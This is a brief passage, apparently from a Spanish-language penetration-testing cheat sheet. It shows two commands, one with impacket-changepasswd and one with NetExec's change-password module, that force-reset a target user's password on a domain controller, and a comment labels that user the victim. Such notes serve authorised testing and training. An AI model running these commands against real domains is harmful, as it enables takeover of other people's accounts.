...
❯ impacket-changepasswd 'domain.corp/user@IP_DC' -altuser user -altpass 'passwd' -newpass 'P@$$w0rd123!' -reset -dc-ip IP_DC
...
❯ nxc smb <IP_DC> -u 'user' -p 'passwd' -M change-password -o USER=targetuser NEWPASS='P@$$w0rd123!'
	...
	# P@$$w0rd123!    = Nueva contraseña para la víctima
```
